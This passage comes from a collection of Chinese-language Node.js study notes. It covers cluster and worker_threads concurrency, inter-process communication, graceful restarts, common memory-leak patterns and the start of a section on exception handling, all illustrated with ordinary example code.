用户代码的同步操作都在这个`主线程`上执行\n\n```javascript\n// 典型的单线程示例\nconsole.log('1');\nsetTimeout(() => console.log('2'), 0);\nconsole.log('3');\n\n// 输出顺序：1, 3, 2\n// 即使 setTimeout 为0，也会在主线程执行完后才执行\n```\n\n### 3.2. 利用多核的主要方式\n\n#### 3.2.1. 使用 Cluster 模块来实现多进程\n\n```javascript hl:6,11\nconst cluster = require('cluster');\nconst http = require('http');\nconst numCPUs = require('os').cpus().length;\n\nif (cluster.isMaster) {\n    // 主进程\n    console.log(`主进程 ${process.pid} 正在运行`);\n\n    // 衍生工作进程\n    for (let i = 0; i < numCPUs; i++) {\n        cluster.fork();\n    }\n\n    cluster.on('exit', (worker, code, signal) => {\n        console.log(`工作进程 ${worker.process.pid} 已退出`);\n    });\n} else {\n    // 工作进程可以共享任何 TCP 连接\n    http.createServer((req, res) => {\n        res.writeHead(200);\n        res.end('你好世界\\n');\n    }).listen(8000);\n\n    console.log(`工作进程 ${process.pid} 已启动`);\n}\n```\n\n#### 3.2.2. 使用 Worker Threads 模块来实现工作线程\n\n```javascript hl:3,8,9\nconst { Worker, isMainThread, parentPort } = require('worker_threads');\n\n// 主线程\nif (isMainThread) {\n    // 这段代码运行在主线程\n\n    // 创建多个工作线程\n    const worker1 = new Worker(__filename);\n    const worker2 = new Worker(__filename);\n\n    // 接收工作线程的消息\n    worker1.on('message', (msg) => {\n        console.log('来自工作线程1的消息:', msg);\n    });\n\n    worker2.on('message', (msg) => {\n        console.log('来自工作线程2的消息:', msg);\n    });\n\n    // 向工作线程发送消息\n    worker1.postMessage('开始任务1');\n    worker2.postMessage('开始任务2');\n} else {\n    // 这段代码运行在工作线程\n    parentPort.on('message', (msg) => {\n        // 执行CPU密集型任务\n        const result = heavyComputation();\n        parentPort.postMessage(result);\n    });\n}\n```\n\n### 3.3. 内置的异步并行处理\n\nNode.js 通过 `libuv 库`提供的`线程池`来处理某些异步操作\n- 比如`文件操作`、`加密操作`，他们都会在**另外的线程池**中操作，从而不会影响主线程\n\n```javascript hl:4,10\nconst fs = require('fs');\nconst crypto = require('crypto');\n\n// 文件操作会使用线程池\nfs.readFile('large-file.txt', (err, data) => {\n    if (err) throw err;\n    console.log('文件读取完成');\n});\n\n// CPU密集型的加密操作也会使用线程池\ncrypto.pbkdf2('密码', '盐值', 100000, 512, 'sha512', (err, key) => {\n    if (err) throw err;\n    console.log('加密完成');\n});\n\n// 这些操作会并行执行\nconsole.log('主线程继续执行');\n```\n\n### 3.4. 实际应用示例\n\n#### 3.4.1. 使用 worker_threads 来处理 CPU密集型任务处理（多线程池）\n\n```javascript\nconst { Worker } = require('worker_threads');\n\nclass WorkerPool {\n    constructor(numThreads) {\n        this.workers = [];\n        this.freeWorkers = [];\n\n        // 创建工作线程池\n        for (let i = 0; i < numThreads; i++) {\n            const worker = new Worker('./worker.js');\n            this.workers.push(worker);\n            this.freeWorkers.push(worker);\n        }\n    }\n\n    async runTask(data) {\n        return new Promise((resolve, reject) => {\n            if (this.freeWorkers.length === 0) {\n                reject(new Error('没有可用的工作线程'));\n                return;\n            }\n\n            const worker = this.freeWorkers.pop();\n            \n            worker.once('message', (result) => {\n                this.freeWorkers.push(worker);\n                resolve(result);\n            });\n\n            worker.once('error', reject);\n            worker.postMessage(data);\n        });\n    }\n}\n\n// 使用示例\nconst pool = new WorkerPool(4); // 创建4个工作线程\npool.runTask({ type: 'compute', data: [1,2,3,4] })\n    .then(result => console.log('计算结果:', result))\n    .catch(err => console.error('错误:', err));\n```\n\n#### 3.4.2. 使用 ==cluster 模块== 来处理 Web服务器负载均衡\n\n示例：利用计算机的多核能力启动多个 HTTP 服务器，以实现负载均衡，如下代码：\n\n```javascript hl:33,13\nconst cluster = require('cluster');\nconst express = require('express');\nconst numCPUs = require('os').cpus().length;\n\nif (cluster.isMaster) {\n    console.log(`主进程 ${process.pid} 正在运行`);\n\n    // 追踪工作进程状态\n    const workers = new Map();\n\n    // 创建工作进程\n    for (let i = 0; i < numCPUs; i++) {\n        const worker = cluster.fork();\n        workers.set(worker.id, { \n            pid: worker.process.pid,\n            requests: 0 \n        });\n    }\n\n    // 监控工作进程\n    cluster.on('exit', (worker, code, signal) => {\n        console.log(`工作进程 ${worker.process.pid} 已退出`);\n        workers.delete(worker.id);\n        // 创建新的工作进程替代死掉的进程\n        const newWorker = cluster.fork();\n        workers.set(newWorker.id, {\n            pid: newWorker.process.pid,\n            requests: 0\n        });\n    });\n\n} else {\n    // 工作进程创建 HTTP 服务器\n    const app = express();\n\n    app.get('/', (req, res) => {\n        res.send(`由工作进程 ${process.pid} 处理的请求`);\n    });\n\n    app.listen(3000, () => {\n        console.log(`工作进程 ${process.pid} 已启动`);\n    });\n}\n```\n\n### 3.5. 性能优化建议\n\n#### 3.5.1. **合理使用进程数量**\n\n- 一般建议与 CPU 核心数相当\n- 考虑预留一些系统资源\n- 注意内存使用情况\n\n#### 3.5.2. **选择合适的并行策略**\n\n- I/O密集型任务：\n\t- 使用异步操作即可\n- CPU密集型任务：\n\t- 使用 `Worker Threads`\n- **需要隔离**的任务：\n\t- 使用 Cluster\n\n#### 3.5.3. **监控和管理**\n\n```javascript hl:7\n// 进程监控示例\nif (cluster.isMaster) {\n    const workers = new Map();\n\n    // 监控内存使用\n    setInterval(() => {\n        const usage = process.memoryUsage();\n        console.log(`内存使用：${Math.round(usage.heapUsed / 1024 / 1024)}MB`);\n        \n        // 如果内存使用过高，可以重启工作进程\n        if (usage.heapUsed > threshold) {\n            restartWorkers();\n        }\n    }, 30000);\n}\n```\n\n通过以上这些机制，Node.js 可以充分利用现代计算机的多核能力，在保持简单的单线程编程模型的同时，实现高效的并行处理。选择哪种方式取决于具体的应用场景和需求，通常的建议是：\n- 普通的Web应用：\n\t- 使用 Cluster 模式就足够了，因为**任务是隔离的**\n- 计算密集型应用：\n\t- **结合使用 Cluster 和 Worker Threads**\n- I/O密集型应用：\n\t- 使用内置的异步机制即可\n\n## 4.  Cluster 模块  →  创建==共享服务器端口==的子进程\n\n### 4.1. Cluster 模块基本概念\n\nCluster 模块允许我们**创建共享服务器端口的子进程**。它主要用于：\n\n- 利用多核 CPU\n- 提高应用程序性能\n- 实现**负载均衡**\n- 提高应用可用性\n\n### 4.2. 基本工作原理\n\n```javascript hl:10\nconst cluster = require('cluster');\nconst http = require('http');\nconst numCPUs = require('os').cpus().length;\n\nif (cluster.isPrimary) {\n    console.log(`主进程 ${process.pid} 正在运行`);\n\n    // 衍生工作进程\n    for (let i = 0; i < numCPUs; i++) {\n        cluster.fork();\n    }\n\n    cluster.on('exit', (worker, code, signal) => {\n        console.log(`工作进程 ${worker.process.pid} 已退出`);\n    });\n} else {\n    // 工作进程共享同一个TCP连接\n    http.createServer((req, res) => {\n        res.writeHead(200);\n        res.end(`工作进程 ${process.pid} 响应\\n`);\n    }).listen(8000);\n\n    console.log(`工作进程 ${process.pid} 已启动`);\n}\n```\n\n### 4.3. 进程间通信（IPC）\n\n- send\n- on('message')\n\n#### 4.3.1. 主进程与工作进程通信\n\n```javascript hl:5,13\nif (cluster.isPrimary) {\n    const worker = cluster.fork();\n    \n    // 主进程发送消息给工作进程\n    worker.send({ type: 'command', data: 'hello' });\n    \n    // 主进程接收工作进程消息\n    worker.on('message', (msg) => {\n        console.log('主进程收到消息:', msg);\n    });\n} else {\n    // 工作进程接收消息\n    process.on('message', (msg) => {\n        console.log('工作进程收到消息:', msg);\n        // 工作进程回复消息\n        process.send({ type: 'response', data: 'received' });\n    });\n}\n```\n\n#### 4.3.2. 工作进程之间通信\n\n```javascript\nif (cluster.isPrimary) {\n    const workers = [];\n    \n    // 创建工作进程\n    for (let i = 0; i < 2; i++) {\n        workers.push(cluster.fork());\n    }\n\n    // 转发消息\n    workers.forEach((worker) => {\n        worker.on('message', (msg) => {\n            workers.forEach((w) => {\n                if (w.id !== worker.id) {\n                    w.send(msg);\n                }\n            });\n        });\n    });\n} else {\n    // 工作进程逻辑\n    process.on('message', (msg) => {\n        console.log(`工作进程 ${process.pid} 收到消息:`, msg);\n    });\n}\n```\n\n### 4.4. 负载均衡\n\n#### 4.4.1. 内置的轮询调度\n\n```javascript\n// Node.js 默认使用轮询调度\nif (cluster.isPrimary) {\n    for (let i = 0; i < numCPUs; i++) {\n        cluster.fork();\n    }\n} else {\n    http.createServer((req, res) => {\n        res.end(`Handled by process ${process.pid}`);\n    }).listen(8000);\n}\n```\n\n#### 4.4.2. 自定义负载均衡\n\n```javascript\nif (cluster.isPrimary) {\n    const workers = new Map();\n    \n    // 跟踪每个工作进程的负载\n    function createWorker() {\n        const worker = cluster.fork();\n        workers.set(worker.id, {\n            process: worker,\n            load: 0\n        });\n        return worker;\n    }\n\n    // 创建工作进程\n    for (let i = 0; i < numCPUs; i++) {\n        createWorker();\n    }\n\n    // 监控工作进程负载\n    workers.forEach((data, id) => {\n        data.process.on('message', (msg) => {\n            if (msg.type === 'load') {\n                data.load = msg.load;\n            }\n        });\n    });\n\n    // 当工作进程退出时重新创建\n    cluster.on('exit', (worker, code, signal) => {\n        console.log(`工作进程 ${worker.process.pid} 已退出`);\n        workers.delete(worker.id);\n        createWorker();\n    });\n}\n```\n\n### 4.5. 优雅退出和零停机重启\n\n- setTimeout \n\t- 给工作进程一定时间来完成当前请求\n- 再配合通讯\n\t- 监听 `process.on` 等\n\n```javascript hl:15,48\nif (cluster.isPrimary) {\n    const workers = new Set();\n\n    // 创建工作进程\n    for (let i = 0; i < numCPUs; i++) {\n        workers.add(cluster.fork());\n    }\n\n    // 优雅退出函数\n    function gracefulShutdown() {\n        workers.forEach(worker => {\n            worker.send('shutdown');\n            \n            // 给工作进程一定时间来完成当前请求\n            setTimeout(() => {\n                if (!worker.isDead()) {\n                    worker.kill();\n                }\n            }, 5000);\n        });\n    }\n\n    // 零停机重启\n    function reload() {\n        workers.forEach(worker => {\n            // 创建新的工作进程\n            const newWorker = cluster.fork();\n            \n            // 等待新进程准备就绪\n            newWorker.on('listening', () => {\n                // 优雅地关闭旧进程\n                worker.disconnect();\n                workers.delete(worker);\n                workers.add(newWorker);\n            });\n        });\n    }\n\n    // 监听信号\n    process.on('SIGTERM', gracefulShutdown);\n    process.on('SIGHUP', reload);\n} else {\n    const server = http.createServer((req, res) => {\n        res.writeHead(200);\n        res.end('hello world\\n');\n    });\n\n    // 监听关闭信号\n    process.on('message', (msg) => {\n        if (msg === 'shutdown') {\n            server.close(() => {\n                process.exit(0);\n            });\n        }\n    });\n\n    server.listen(8000);\n}\n```\n\n### 4.6. 监控和日志\n\n```javascript\nif (cluster.isPrimary) {\n    const workers = new Map();\n\n    // 监控指标\n    const metrics = {\n        totalRequests: 0,\n        activeWorkers: 0,\n        failedRequests: 0\n    };\n\n    function createWorker() {\n        const worker = cluster.fork();\n        workers.set(worker.id, {\n            startTime: Date.now(),\n            requests: 0,\n            errors: 0\n        });\n        metrics.activeWorkers++;\n        \n        // 监听工作进程消息\n        worker.on('message', (msg) => {\n            if (msg.type === 'metric') {\n                const stats = workers.get(worker.id);\n                stats.requests++;\n                metrics.totalRequests++;\n                \n                if (msg.error) {\n                    stats.errors++;\n                    metrics.failedRequests++;\n                }\n            }\n        });\n\n        return worker;\n    }\n\n    // 定期输出监控信息\n    setInterval(() => {\n        console.log('集群状态:', {\n            activeWorkers: metrics.activeWorkers,\n            totalRequests: metrics.totalRequests,\n            failedRequests: metrics.failedRequests,\n            workerStats: Array.from(workers.entries()).map(([id, stats]) => ({\n                id,\n                uptime: (Date.now() - stats.startTime) / 1000,\n                requests: stats.requests,\n                errors: stats.errors\n            }))\n        });\n    }, 10000);\n\n    // 创建工作进程\n    for (let i = 0; i < numCPUs; i++) {\n        createWorker();\n    }\n}\n```\n\n### 4.7. 最佳实践\n\n#### 4.7.1. **进程数量管理**\n\n```javascript\nconst WORKERS = process.env.NODE_ENV === 'production' \n    ? numCPUs \n    : Math.min(2, numCPUs);\n```\n\n#### 4.7.2. **错误处理**\n\n```javascript hl:7\nif (cluster.isPrimary) {\n    cluster.on('exit', (worker, code, signal) => {\n        if (signal) {\n            console.log(`工作进程被信号${signal}终止`);\n        } else if (code !== 0) {\n            console.log(`工作进程异常退出，错误码：${code}`);\n            cluster.fork(); // 重新创建工作进程\n        }\n    });\n}\n```\n\n#### 4.7.3. **健康检查**\n\n```javascript\nif (cluster.isPrimary) {\n    function healthCheck() {\n        workers.forEach((worker) => {\n            worker.send({ type: 'health_check' });\n            \n            const timeout = setTimeout(() => {\n                console.log(`工作进程 ${worker.process.pid} 无响应`);\n                worker.kill();\n            }, 5000);\n\n            worker.once('message', (msg) => {\n                if (msg.type === 'health_check_response') {\n                    clearTimeout(timeout);\n                }\n            });\n        });\n    }\n\n    setInterval(healthCheck, 30000);\n}\n```\n\n通过这些机制和最佳实践，Cluster 模块能够帮助我们构建高可用、可伸缩的 Node.js 应用。它是利用多核系统、提高应用性能的重要工具。\n\n## 5. Node.js 应用中多核、多 CPU、多进程和多线程的区别和关系\n\n### 5.1. 多核（Multi-Core）\n\n多核指的是在**单个 CPU** 物理芯片上集成多个完整的计算核心\n\n```javascript\nconst os = require('os');\n\n// 获取 CPU 信息\nconsole.log('CPU 核心数:', os.cpus().length);\nconsole.log('CPU 详细信息:', os.cpus());\n\n// 输出示例\n/*\nCPU 核心数: 8\nCPU 详细信息: [\n  {\n    model: 'Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz',\n    speed: 2600,\n    times: { user: 123456, nice: 0, sys: 34567, idle: 789012, irq: 1234 }\n  },\n  // ... 更多核心信息\n]\n*/\n```\n\n### 5.2. 多 CPU（Multi-CPU）\n\n多 CPU 指系统中安装了**多个物理 CPU 芯片**。每个 CPU 可能包含多个核心。\n\n```javascript\nconst os = require('os');\n\n// 检查系统架构和平台信息\nconsole.log('系统架构:', os.arch());\nconsole.log('平台:', os.platform());\nconsole.log('总内存:', os.totalmem() / 1024 / 1024 / 1024, 'GB');\nconsole.log('空闲内存:', os.freemem() / 1024 / 1024 / 1024, 'GB');\n\n```\n\n### 5.3. 多进程（Multi-Process）\n\n进程是程序的一个独立实例，拥有独立的内存空间。**Node.js 通过 cluster 模块实现多进程**。\n\n> cluster 模块 可 创建共享端口的多进程\n\n```javascript\nconst cluster = require('cluster');\nconst http = require('http');\nconst numCPUs = require('os').cpus().length;\n\nif (cluster.isPrimary) {\n    console.log(`主进程 ${process.pid} 正在运行`);\n\n    // 记录进程信息\n    const workers = new Map();\n\n    // 创建工作进程\n    for (let i = 0; i < numCPUs; i++) {\n        const worker = cluster.fork();\n        workers.set(worker.id, {\n            pid: worker.process.pid,\n            startTime: Date.now(),\n            requests: 0\n        });\n    }\n\n    // 进程间通信示例\n    cluster.on('message', (worker, message) => {\n        const workerInfo = workers.get(worker.id);\n        if (message.type === 'request_completed') {\n            workerInfo.requests++;\n        }\n    });\n\n    // 监控进程状态\n    setInterval(() => {\n        console.log('进程状态报告:');\n        for (const [id, info] of workers) {\n            console.log(`工作进程 ${info.pid}:`, {\n                uptime: (Date.now() - info.startTime) / 1000,\n                requests: info.requests\n            });\n        }\n    }, 10000);\n\n} else {\n    // 工作进程创建 HTTP 服务器\n    http.createServer((req, res) => {\n        res.writeHead(200);\n        res.end(`来自进程 ${process.pid} 的响应\\n`);\n        \n        // 通知主进程请求完成\n        process.send({ type: 'request_completed' });\n    }).listen(8000);\n\n    console.log(`工作进程 ${process.pid} 已启动`);\n}\n```\n\n### 5.4. 多线程（Multi-Thread）\n\n==线程==是进程中的执行单元，共享进程的内存空间。**Node.js 通过 worker_threads 模块实现多线程**。\n\n```javascript\nconst { Worker, isMainThread, parentPort, workerData } = require('worker_threads');\n\nif (isMainThread) {\n    // 主线程代码\n    const threads = new Map();\n    const threadCount = 4;\n    \n    // 创建线程池\n    class ThreadPool {\n        constructor(size) {\n            this.size = size;\n            this.workers = new Map();\n            this.queue = [];\n            this.activeWorkers = 0;\n        }\n\n        addWorker() {\n            const worker = new Worker(__filename, {\n                workerData: { threadId: this.workers.size }\n            });\n\n            const workerInfo = {\n                worker: worker,\n                busy: false,\n                taskCount: 0\n            };\n\n            worker.on('message', (result) => {\n                workerInfo.busy = false;\n                workerInfo.taskCount++;\n                this.activeWorkers--;\n                this.processQueue();\n            });\n\n            this.workers.set(worker.threadId, workerInfo);\n        }\n\n        async runTask(task) {\n            return new Promise((resolve, reject) => {\n                const queueItem = { task, resolve, reject };\n                this.queue.push(queueItem);\n                this.processQueue();\n            });\n        }\n\n        processQueue() {\n            if (this.queue.length === 0) return;\n\n            for (const [threadId, workerInfo] of this.workers) {\n                if (!workerInfo.busy && this.queue.length > 0) {\n                    const { task, resolve, reject } = this.queue.shift();\n                    workerInfo.busy = true;\n                    this.activeWorkers++;\n                    \n                    workerInfo.worker.postMessage(task);\n                    \n                    workerInfo.worker.once('message', resolve);\n                    workerInfo.worker.once('error', reject);\n                }\n            }\n        }\n\n        getStats() {\n            const stats = {\n                totalWorkers: this.workers.size,\n                activeWorkers: this.activeWorkers,\n                queueLength: this.queue.length,\n                workerStats: []\n            };\n\n            for (const [threadId, info] of this.workers) {\n                stats.workerStats.push({\n                    threadId,\n                    busy: info.busy,\n                    taskCount: info.taskCount\n                });\n            }\n\n            return stats;\n        }\n    }\n\n    // 使用线程池\n    const pool = new ThreadPool(threadCount);\n    \n    // 初始化线程池\n    for (let i = 0; i < threadCount; i++) {\n        pool.addWorker();\n    }\n\n    // 示例：执行CPU密集型任务\n    async function runTasks() {\n        const tasks = Array(10).fill().map((_, i) => ({\n            type: 'compute',\n            data: i\n        }));\n\n        console.log('开始执行任务...');\n\n        const results = await Promise.all(\n            tasks.map(task => pool.runTask(task))\n        );\n\n        console.log('所有任务完成:', results);\n        console.log('线程池状态:', pool.getStats());\n    }\n\n    runTasks().catch(console.error);\n\n} else {\n    // 工作线程代码\n    parentPort.on('message', (task) => {\n        // 模拟CPU密集型操作\n        let result;\n        \n        switch (task.type) {\n            case 'compute':\n                // 示例计算任务\n                result = heavyComputation(task.data);\n                break;\n            default:\n                result = null;\n        }\n\n        parentPort.postMessage({\n            threadId: workerData.threadId,\n            result: result\n        });\n    });\n\n    function heavyComputation(n) {\n        let result = 0;\n        for (let i = 0; i < 1000000; i++) {\n            result += Math.sqrt(n * i);\n        }\n        return result;\n    }\n}\n```\n\n### 5.5. 各种模型的对比\n\n#### 5.5.1. **资源占用**\n\n```javascript\n// 内存使用对比示例\nconst process = require('process');\n\nfunction showMemoryUsage() {\n    const used = process.memoryUsage();\n    console.log({\n        rss: `${Math.round(used.rss / 1024 / 1024 * 100) / 100} MB`,    // 进程总内存\n        heapTotal: `${Math.round(used.heapTotal / 1024 / 1024 * 100) / 100} MB`,  // V8 总堆内存\n        heapUsed: `${Math.round(used.heapUsed / 1024 / 1024 * 100) / 100} MB`,    // V8 已用堆内存\n        external: `${Math.round(used.external / 1024 / 1024 * 100) / 100} MB`,     // C++ 对象内存\n    });\n}\n```\n\n#### 5.5.2. **通信成本**\n\n```javascript\n// 进程间通信示例\nif (cluster.isPrimary) {\n    const worker = cluster.fork();\n    console.time('ipc');\n    worker.send('ping');\n    worker.on('message', (msg) => {\n        if (msg === 'pong') {\n            console.timeEnd('ipc');\n        }\n    });\n} else {\n    process.on('message', (msg) => {\n        if (msg === 'ping') {\n            process.send('pong');\n        }\n    });\n}\n\n// 线程间通信示例\nif (isMainThread) {\n    const worker = new Worker(__filename);\n    console.time('thread');\n    worker.postMessage('ping');\n    worker.on('message', (msg) => {\n        if (msg === 'pong') {\n            console.timeEnd('thread');\n        }\n    });\n} else {\n    parentPort.on('message', (msg) => {\n        if (msg === 'ping') {\n            parentPort.postMessage('pong');\n        }\n    });\n}\n```\n\n### 5.6. 选择建议\n\n#### 5.6.1. **I/O 密集型应用**\n\n>  使用异步 I/O 即可，不需要多进程/多线程\n\n```javascript\n// 使用异步 I/O 即可，不需要多进程/多线程\nconst fs = require('fs').promises;\n\nasync function handleIO() {\n    const file1 = fs.readFile('file1.txt');\n    const file2 = fs.readFile('file2.txt');\n    const [content1, content2] = await Promise.all([file1, file2]);\n    // 处理文件内容\n}\n```\n\n#### 5.6.2. **CPU 密集型应用**  →  worker_threads\n\n```javascript\n// 使用 Worker Threads\nconst { Worker } = require('worker_threads');\n\nfunction runWorker(workerData) {\n    return new Promise((resolve, reject) => {\n        const worker = new Worker('./worker.js', { workerData });\n        worker.on('message', resolve);\n        worker.on('error', reject);\n        worker.on('exit', (code) => {\n            if (code !== 0) {\n                reject(new Error(`Worker stopped with exit code ${code}`));\n            }\n        });\n    });\n}\n```\n\n#### 5.6.3. **Web 服务器**  → 使用 `Cluster`\n\n```javascript hl:1\n// 使用 Cluster\nif (cluster.isPrimary) {\n    // 根据 CPU 核心数创建工作进程\n    for (let i = 0; i < numCPUs; i++) {\n        cluster.fork();\n    }\n} else {\n    // Express 应用\n    const express = require('express');\n    const app = express();\n    app.listen(3000);\n}\n```\n\n#### 5.6.4. 总结\n\n- 多核和多 CPU 是硬件层面的概念\n- **多进程 = 多核** ：\n\t- 适合需要隔离的场景，如 Web 服务器\n- 多线程：\n\t- 适合 ==CPU 密集型==任务\n- Node.js 的事件循环\n\t- 适合 ==I/O 密集型==任务\n\n\n","KsztARZW":"\n# 流与pipe\n\n`#nodejs` \n\n\n## 目录\n<!-- toc -->\n ## 1. 硬盘 → 内存 → 客户端 \n\n![图片&文件](./files/20241027-6.png)\n\n## 2. `koa`实现流对象读取示例\n\n>  ctx.body = xxxx ，其实 koa 框架已经帮您封装好了\n\n![图片&文件](./files/20241027-7.png)\n","ih56iVRv":"\n# Node.js 中常见的内存泄漏场景及解决方案\n\n`#nodejs` `#R1` \n\n\n## 目录\n<!-- toc -->\n ## 1. 全局变量引起的内存泄漏 \n\n```javascript hl:1,8\n// 错误示例：全局变量累积\nglobal.dataStore = [];\n\nfunction addData(data) {\n    global.dataStore.push(data);\n}\n\n// 正确示例：使用局部变量或及时清理\nclass DataManager {\n    constructor() {\n        this.dataStore = new Map();\n        this.maxSize = 1000;\n    }\n\n    addData(key, data) {\n        // 设置容量限制\n        if (this.dataStore.size >= this.maxSize) {\n            const firstKey = this.dataStore.keys().next().value;\n            this.dataStore.delete(firstKey);\n        }\n        this.dataStore.set(key, data);\n    }\n\n    clearOldData() {\n        const now = Date.now();\n        for (const [key, data] of this.dataStore) {\n            if (now - data.timestamp > 3600000) { // 1小时前的数据\n                this.dataStore.delete(key);\n            }\n        }\n    }\n}\n```\n\n## 2. 闭包导致的内存泄漏\n\n```javascript hl:6,17\n// 错误示例：闭包持有大对象引用\nfunction createLeak() {\n    const largeData = new Array(1000000);\n    \n    return function() {\n        console.log(largeData[0]); // largeData 一直被持有\n    }\n}\n\n// 正确示例：使用完即释放\nfunction betterImplementation() {\n    let result;\n    {\n        const largeData = new Array(1000000);\n        result = largeData[0];\n    }\n    // largeData 在这里已经可以被垃圾回收\n    return function() {\n        console.log(result);\n    }\n}\n```\n\n## 3. 事件监听器未移除\n\n```javascript hl:26,5\n// 错误示例：事件监听器累积\nclass LeakyClass {\n    constructor() {\n        this.data = new Array(10000);\n        process.on('data', this.onData.bind(this));\n    }\n\n    onData(data) {\n        // 处理数据\n    }\n}\n\n// 正确示例：提供移除监听器的方法\nclass BetterClass {\n    constructor() {\n        this.data = new Array(10000);\n        this.boundOnData = this.onData.bind(this);\n        this.setupListeners();\n    }\n\n    setupListeners() {\n        process.on('data', this.boundOnData);\n    }\n\n    cleanup() {\n        process.removeListener('data', this.boundOnData);\n    }\n\n    onData(data) {\n        // 处理数据\n    }\n}\n\n// 使用示例\nconst instance = new BetterClass();\n// 使用完后清理\ninstance.cleanup();\n```\n\n## 4. 缓存未限制大小\n\n```javascript hl:1,15\n// 错误示例：无限制的缓存\nconst cache = {};\n\nfunction addToCache(key, value) {\n    cache[key] = value;\n}\n\n// 正确示例：使用 LRU 缓存\nconst LRU = require('lru-cache');\nconst cache = new LRU({\n    max: 500,   // 最大项数\n    maxAge: 1000 * 60 * 60 // 项的最大年龄（1小时）\n});\n\n// 或者使用 Map 实现简单的 LRU\nclass SimpleCache {\n    constructor(limit = 1000) {\n        this.limit = limit;\n        this.cache = new Map();\n    }\n\n    set(key, value) {\n        if (this.cache.size >= this.limit) {\n            const firstKey = this.cache.keys().next().value;\n            this.cache.delete(firstKey);\n        }\n        this.cache.set(key, value);\n    }\n\n    get(key) {\n        const value = this.cache.get(key);\n        if (value) {\n            // 刷新访问顺序\n            this.cache.delete(key);\n            this.cache.set(key, value);\n        }\n        return value;\n    }\n}\n```\n\n## 5. 定时器未清理\n\n```javascript hl:27,1\n// 错误示例：定时器未清理\nfunction startPolling() {\n    setInterval(() => {\n        // 执行某些操作\n    }, 1000);\n}\n\n// 正确示例：可清理的定时器\nclass PollingManager {\n    constructor() {\n        this.timers = new Set();\n    }\n\n    startPolling(fn, interval) {\n        const timer = setInterval(fn, interval);\n        this.timers.add(timer);\n        return timer;\n    }\n\n    stopPolling(timer) {\n        clearInterval(timer);\n        this.timers.delete(timer);\n    }\n\n    stopAll() {\n        for (const timer of this.timers) {\n            clearInterval(timer);\n        }\n        this.timers.clear();\n    }\n}\n```\n\n## 6. Promise 链未处理 \n\n```javascript hl:1,15\n// 错误示例：未处理的 Promise\nfunction leakyPromise() {\n    return new Promise(resolve => {\n        const hugeData = new Array(1000000);\n        resolve(hugeData);\n    });\n}\n\n// 正确示例：确保 Promise 链正确处理和结束\nasync function betterPromise() {\n    try {\n        const hugeData = await processData();\n        // 使用完数据后置为 null\n        hugeData = null;\n    } catch (error) {\n        console.error('Error:', error);\n    }\n}\n```\n\n## 7. Stream 未正确处理\n\n```javascript hl:18,22\n// 错误示例：流未正确处理\nconst fs = require('fs');\n\nconst readStream = fs.createReadStream('large-file.txt');\nreadStream.on('data', (chunk) => {\n    // 处理数据\n});\n\n// 正确示例：正确处理流\nclass StreamHandler {\n    constructor() {\n        this.streams = new Set();\n    }\n\n    handleStream(stream) {\n        this.streams.add(stream);\n\n        stream.on('end', () => {\n            this.streams.delete(stream);\n        });\n\n        stream.on('error', (error) => {\n            console.error('Stream error:', error);\n            this.streams.delete(stream);\n        });\n\n        return stream;\n    }\n\n    cleanup() {\n        for (const stream of this.streams) {\n            stream.destroy();\n        }\n        this.streams.clear();\n    }\n}\n\n// 使用示例\nconst streamHandler = new StreamHandler();\nconst readStream = streamHandler.handleStream(\n    fs.createReadStream('large-file.txt')\n);\n```\n\n## 8. 内存使用监控\n\n```javascript hl:9\nclass MemoryMonitor {\n    constructor(threshold = 0.8) { // 80% 阈值\n        this.threshold = threshold;\n        this.startMonitoring();\n    }\n\n    startMonitoring() {\n        this.interval = setInterval(() => {\n            const usage = process.memoryUsage();\n            const heapUsed = usage.heapUsed;\n            const heapTotal = usage.heapTotal;\n            const usage_ratio = heapUsed / heapTotal;\n\n            console.log('内存使用情况:', {\n                heapUsed: `${Math.round(heapUsed / 1024 / 1024)} MB`,\n                heapTotal: `${Math.round(heapTotal / 1024 / 1024)} MB`,\n                usage: `${Math.round(usage_ratio * 100)}%`\n            });\n\n            if (usage_ratio > this.threshold) {\n                this.handleHighMemoryUsage(usage);\n            }\n        }, 30000); // 每30秒检查一次\n    }\n\n    handleHighMemoryUsage(usage) {\n        console.warn('内存使用过高警告！');\n        // 这里可以添加告警逻辑\n        // 例如：发送告警邮件、清理缓存等\n    }\n\n    stop() {\n        if (this.interval) {\n            clearInterval(this.interval);\n        }\n    }\n}\n\n// 使用示例\nconst monitor = new MemoryMonitor();\n```\n\n## 9. WeakMap 和 WeakSet 的使用\n\n```javascript\n// 使用 WeakMap 存储对象相关的数据\nclass DomNodeData {\n    constructor() {\n        // 使用 WeakMap 存储 DOM 节点相关的数据\n        this.nodeData = new WeakMap();\n    }\n\n    setData(node, data) {\n        this.nodeData.set(node, data);\n    }\n\n    getData(node) {\n        return this.nodeData.get(node);\n    }\n}\n\n// WeakMap 会在对象被垃圾回收时自动清理相关数据\nconst nodeData = new DomNodeData();\n```\n\n## 10. 最后\n\n以上 Node.js 中常见的内存泄漏场景及其解决方案。要避免内存泄漏，关键是要：\n\n1. 及时清理不再使用的资源\n2. 限制缓存大小\n3. 正确处理事件监听器\n4. 使用适当的数据结构（如 WeakMap）\n5. 实施监控机制\n6. 定期进行内存使用分析\n\n同时，建议使用工具如 `node-heapdump`、`node --inspect` 等进行内存分析和调试。\n\n","mVKAC86c":"\n# Node.js 中异常捕获和容错的常见处理方式\n\n`#nodejs` \n\n\n## 目录\n<!-- toc -->\n ## 1. try-catch 捕获同步异常 \n\n```javascript\n// 基本的同步异常捕获\nfunction syncOperation() {\n    try {\n        const result = JSON.parse('{\"invalid\": json}');\n        return result;\n    } catch (error) {\n        console.error('同步错误:', {\n            name: error.name,\n            message: error.message,\n            stack: error.stack\n        });\n        // 可以返回默认值或重新抛出错误\n        return { error: true };\n    }\n}\n```\n\n## 2. Promise 异常处理\n\n```javascript\n// Promise 链式调用异常处理\nasync function asyncOperation() {\n    try {\n        const result = await fetch('https://api.example.com/data')\n            .then(response => response.json())\n            .catch(error => {\n                console.error('Fetch 错误:', error);\n                return null;\n            });\n\n        if (!result) {\n            throw new Error('获取数据失败');\n        }\n\n        return result;\n    } catch (error) {\n        console.error('异步操作错误:', error);\n        return null;\n    }\n}\n\n// Promise.all 错误处理\nasync function multipleAsyncOperations() {\n    try {\n        const promises = [\n            fetch('https://api1.example.com'),\n            fetch('https://api2.example.com'),\n            fetch('https://api3.example.com')\n        ];\n\n        const results = await Promise.all(\n            promises.map(p => p.catch(error => {\n                console.error('单个请求失败:', error);\n                return null;\n            }))\n        );\n\n        return results.filter(result => result !== null);\n    } catch (error) {\n        console.error('批量请求错误:', error);\n        return [];\n    